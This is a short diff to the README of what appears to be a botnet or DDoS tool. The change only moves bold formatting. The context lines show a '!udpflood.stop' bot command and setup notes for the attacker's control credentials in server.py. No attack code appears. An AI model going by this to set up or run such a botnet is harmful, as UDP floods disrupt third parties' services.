@@ -20,4 +20,4 @@
 - ``` !udpflood.stop ``` **Stop the attack**
 
 ## Modify it
-- **user_required and pass_required on server.py (It is the username and password that the attacker will use to control the bots.)**
+- user_required and pass_required on server.py **(It is the username and password that the attacker will use to control the bots.)**
